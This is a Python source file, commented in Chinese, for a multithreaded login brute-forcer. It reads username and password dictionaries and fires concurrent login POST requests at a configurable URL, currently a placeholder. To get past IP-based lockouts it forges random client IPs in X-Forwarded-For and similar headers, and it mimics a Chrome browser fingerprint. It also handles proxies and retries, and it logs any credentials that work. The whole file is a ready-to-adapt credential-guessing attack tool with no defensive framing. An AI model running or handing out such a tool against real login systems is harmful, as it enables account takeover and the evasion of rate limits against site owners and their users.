# coding=utf-8

import os
import random
import threading
import time
import traceback
from concurrent import futures
from datetime import datetime, timedelta
from wreq import Emulation, Proxy
from wreq.blocking import Client
#
# =================== [ 全局设置 ] ===================
#

configs = \
{
    # 账户字典
    "usernames": {
        "username_list": [
            "admin"
        ],
        "username_file_path": [
        ] # /path/to/username.txt
    },

    # 字典文件
    "passwords": {
        "password_list": [
            "123456"
        ],
        "password_file_path": [
        ] # /path/to/password.txt
    },

    # 超时时间，单位秒
    "timeout": 10,

    # 线程并发数，在涉及到验证码识别的时候不应使用多线程，因为会导致验证码会话错乱，此时并发需要设置为1
    "threads": 10,
    
    # 每个线程发起请求后暂停时长，单位秒
    "delay": 1,

    # 密码爆破日志
    "logfile": {
        "history": "history.txt", # 爆破历史文件
        "found": "found.txt", # 正常的爆破日志
        "exception": "exception.txt", # 发生异常时的日志
    },

    # 设置代理，支持的格式 socks5://username:password@proxyserver.com:1080
    "proxy": "", # 代理值为空字符串、None则表示不使用代理

    # 自定义headers
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        "Connection": "close",
        # "X-Requested-With": "XMLHttpRequest"
    },

    # 自定义cookies
    "cookies": {
        # "JSESSIONID": "1"
    }
}

# 日志输出互斥锁
global_locks = \
{
    # 日志文件互斥锁（找到密码）
    "found": threading.Lock(),

    # 日志文件互斥锁（异常日志）
    "exception": threading.Lock(),

    # 计数互斥锁（完成任务计数）
    "finished": threading.Lock()
}

# 多线程信号控制
global_variables = \
{
    # 总共登录次数
    "total_login_count": 0,
    
    # 已完成的任务数量
    "finished_task_count": 0,
    
    # 任务异常计数，异常任务数量过多程序将自动退出
    "exception_task_count": 0,
    
    # 任务启动时间，用于预估剩余时间
    "started_at": datetime.now(),
    
    # 上次报告进度的时间
    "last_report_at": datetime.now(),
    
    # 爆破历史记录
    "history": set()
}

#
# =================== [ 功能函数 ] ===================
#

# 普通日志输出
def info_message(message: str, show_on_console=True):
    with global_locks["found"]:
        if show_on_console:
            print(message)
        with open(configs["logfile"]["found"], "a", encoding="utf-8") as fout:
            fout.write(message + "\n")

# 异常日志输出
def exception_message(message: str, show_on_console=True):
    with global_locks["exception"]:
        if show_on_console:
            print(message)
        with open(configs["logfile"]["exception"], "a", encoding="utf-8") as fout:
            fout.write(message + "\n")

# deltatime 格式化
def strfdelta(delta, fmt):
    d = dict()
    d["days"] = delta.days
    d["hours"], rem = divmod(delta.seconds, 3600)
    d["minutes"], d["seconds"] = divmod(rem, 60)
    return fmt.format(**d)

#
# =================== [ 爆破函数 ] ===================
#

# 爆破函数，成功运行返回账号密码的组合(username, password)，失败返回False
# 注意：
# 返回值只代表本轮爆破有没有遇到异常，不表示是否成功得到可登录的账号密码
# 返回的账号密码组合用于储存到history文件中，防止重复爆破
def run(username, password):
    time.sleep(configs["delay"])
    
    headers = configs["headers"].copy()
    random_ip = ".".join(str(random.randint(0,255)) for _ in range(4))
    headers.update({
        "X-Forwarded-For": random_ip,
        "X-Originating-IP": random_ip,
        "X-Remote-IP": random_ip,
        "X-Remote-Addr": random_ip,
        "X-Real-IP": random_ip
    })
    cookies = configs["cookies"].copy()
    if configs["proxy"]:
        proxy = Proxy.all(configs["proxy"])
    else:
        proxy = None
    timeout = timedelta(seconds=configs["timeout"])
    
    url = "https://httpbin.org/post"
    try:
        client = Client(emulation=Emulation.Chrome153)

        # 在某种条件下可以尝试重复请求，如验证码识别错误，服务器响应502等
        error = {}
        error["502"] = 0
        error["captcha"] = 0

        # 循环发起请求
        while True:
            data = {
                "username": username,
                "password": password
            }
            response = client.post(url, json=data, cookies=cookies, headers=headers, proxy=proxy, timeout=timeout, verify=False)

            if response.status == 502:
                error["502"] += 1
                if error["502"] > 5:
                    raise Exception("Server internal error")
                continue
            # elif "验证码有误" in response.text:
            #     error["captcha"] += 1
            #     if error["captcha"] > 5:
            #         raise Exception("Incorrect captcha")
            #     continue
            else:
                break

        # 一般情况下可以知道登录失败会返回什么报文，而不知道登录成功会返回什么报文
        # 因此 if 和 elif 里只写登录失败的情况，用 else 来处理登录成功的情况

        # if len(response.text(encoding="utf-8")) == 100:
        # if response.status == 401:
        # if "Login failed" in response.text(encoding="utf-8"):
        # if response.status == 302 and "index/login.html" in response.headers['Location']:

        if "用户不存在" in response.text(encoding="utf-8"):
            return (username, password)
        else:
            # 找到密码
            length = len(response.text(encoding="utf-8"))
            info_message(f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status} length:{length}")
            return (username, password)

    except (ConnectionError, TimeoutError) as e:
        exception_message(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Error: {e}")
        return False

    except Exception as e:
        exception_message(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Error: {e}, detail:\n" + traceback.format_exc())
        return False

#
# =================== [ 启动多线程爆破 ] ===================
#

# 输出当前进度
def output_current_progress():
    # 获取当前时间
    now = datetime.now()
    # 计算进度百分比
    progress_percent = global_variables["finished_task_count"] / global_variables["total_login_count"]
    # 输出进度
    if progress_percent != 0.0:
        # 已用时间
        elapsed = now - global_variables["started_at"]
        # 预估剩余时间
        estimated_remaining_time = (elapsed / progress_percent) - elapsed
        # 转换成人类可读时间
        estimated_remaining_time = strfdelta(estimated_remaining_time, "{days} days {hours}:{minutes}:{seconds}")
        # 进度汇报语句拼装
        progress_output = "[!] {} {}/{} {}% finished. {} remaining".format(
            now.strftime('%H:%M:%S'),
            global_variables["finished_task_count"],
            global_variables["total_login_count"],
            round(progress_percent * 100, 2),
            estimated_remaining_time)
        # 输出进度
        print(progress_output)
    else:
        # 进度汇报语句拼装
        progress_output = "[!] {} {}/{} {}% finished".format(
            now.strftime('%H:%M:%S'),
            global_variables["finished_task_count"],
            global_variables["total_login_count"],
            round(progress_percent * 100, 2))
        print(progress_output)

# 任务回调函数
def callback(future):
    # 已完成任务计数累加
    with global_locks["finished"]:
        global_variables["finished_task_count"] += 1
    # 调整连续失败任务计数，并把正常爆破的账号密码记录下来
    if future.result() == False:
        global_variables["exception_task_count"] += 1
    else:
        global_variables["exception_task_count"] = 0
        username, password = future.result()
        global_variables["history"].add(f"{username}:{password}")

# 并发运行爆破函数
def concurrent_run(executor, tasks, usernames, passwords):
    # 遍历密码和用户名进行爆破
    for password in passwords:
        for username in usernames:
            # 如果账号密码组合已经登录过，则跳过
            if f"{username}:{password}" in global_variables["history"]:
                continue
            # 如果队列过长就等待
            if len(tasks) >= configs["threads"]:
                _, tasks = futures.wait(tasks, return_when=futures.FIRST_COMPLETED)
            # 如果连续失败计数大于等于20，则停止爆破
            if global_variables["exception_task_count"] >= 20:
                exception_message(f"[x] {datetime.now().strftime('%H:%M:%S')} Error: Too much exception. Exiting")
                return
            # 新建线程
            task = executor.submit(run, username, password)
            task.add_done_callback(callback)
            tasks.add(task)
            # 每5分钟显示一次进度，并保存登录记录
            if datetime.now() - global_variables["last_report_at"] > timedelta(minutes=5):
                # 显示进度
                output_current_progress()
                # 重置上次报告时间
                global_variables["last_report_at"] = datetime.now()

if __name__ == "__main__":
    # 加载用户名字典 - 列表
    usernames = configs["usernames"]["username_list"].copy()
    # 加载用户名字典 - 文件
    if len(configs["usernames"]["username_file_path"]) > 0:
        for path in configs["usernames"]["username_file_path"]:
            try:
                with open(path, "r", encoding="utf-8") as fin:
                    for line in fin:
                        line = line.strip()
                        if not line:
                            continue
                        usernames.append(line)
            except Exception as e:
                print(f'[x] Cannot open \'{path}\' username file {e}')
                os._exit(0)

    # 加载密码字典 - 列表
    passwords = configs["passwords"]["password_list"].copy()
    # 加载密码字典 - 文件
    if len(configs["passwords"]["password_file_path"]) > 0:
        for path in configs["passwords"]["password_file_path"]:
            try:
                with open(path, "r", encoding="utf-8") as fin:
                    for line in fin:
                        line = line.strip()
                        if not line:
                            continue
                        passwords.append(line)
            except Exception as e:
                print(f'[x] Cannot open \'{path}\' password file {e}')
                os._exit(0)

    # 计算总登录次数
    global_variables["total_login_count"] = len(usernames) * len(passwords)
    if global_variables["total_login_count"] == 0:
        print("[!] Total login attempts: 0. Exiting.")
        os._exit(0)

    # 载入历史文件，期望格式：
    # admin:123456
    # admin:admin
    # admin:admin123456
    # guest:123456
    # guest:guest
    try:
        with open(configs["logfile"]["history"], "r", encoding="utf-8") as fin:
            for line in fin:
                line = line.strip()
                if not line:
                    continue
                global_variables["history"].add(line)
    except Exception as e:
        pass # 历史文件加载失败则直接无视

    # 日志记录时间
    info_message(f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    exception_message(f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n", False)

    # 启动线程池
    tasks = set()
    with futures.ThreadPoolExecutor(max_workers=configs["threads"]) as executor:
        try:
            concurrent_run(executor, tasks, usernames, passwords)
            # 全部遍历完成后发出提示
            print("[!] Wait for all threads exit.")
            futures.wait(tasks, return_when=futures.ALL_COMPLETED)
        except KeyboardInterrupt:
            # 键盘中断信号
            print("[!] Get Ctrl-C, wait for all threads exit.")
            futures.wait(tasks, return_when=futures.ALL_COMPLETED)

    # 任务结束，保存登录记录
    try:
        with open(configs["logfile"]["history"], "w", encoding="utf-8") as fout:
            for item in global_variables["history"]:
                fout.write(item + "\n")
    except Exception as e:
        print(f"[x] Failed to save history file. Error: {e}")
